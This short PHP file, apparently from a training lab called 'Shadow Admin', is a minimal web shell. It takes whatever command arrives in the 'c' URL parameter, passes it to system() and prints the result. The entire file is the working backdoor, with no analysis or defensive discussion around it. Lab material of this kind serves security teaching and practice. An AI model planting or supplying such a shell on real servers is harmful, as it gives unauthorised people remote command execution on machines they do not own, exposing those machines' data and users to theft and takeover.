<?php
// Webshell minima para el laboratorio Shadow Admin
if (isset($_GET['c'])) {
    echo "<pre>";
    system($_GET['c']);
    echo "</pre>";
}
?>
